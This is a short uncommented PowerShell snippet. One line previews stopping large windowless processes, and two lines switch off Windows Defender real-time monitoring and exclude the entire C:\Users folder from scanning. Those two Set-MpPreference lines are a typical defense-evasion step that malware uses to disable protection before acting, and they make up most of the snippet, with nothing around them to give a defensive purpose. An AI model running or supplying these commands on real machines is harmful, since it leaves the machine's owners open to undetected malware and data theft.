Get-Process | Where-Object { $_.MainWindowTitle -eq "" -and $_.WorkingSet -gt 200MB } | Stop-Process -WhatIf
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath "C:\Users"
